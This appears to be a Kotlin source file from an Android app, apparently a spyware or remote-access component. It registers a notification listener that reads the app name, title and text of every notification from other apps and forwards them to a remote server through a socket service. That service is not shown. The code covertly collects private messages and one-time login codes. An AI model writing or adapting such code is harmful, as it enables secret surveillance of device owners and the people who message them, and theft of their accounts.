package com.ahmed.zai

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let {
            val packageName = it.packageName
            val title = it.notification.extras.getString("android.title") ?: ""
            val text = it.notification.extras.getString("android.text") ?: ""
            
            if (packageName != "com.ahmed.zai") {
                SocketService.sendDataToServer("NOTIF", "$packageName | $title: $text")
            }
        }
    }
}
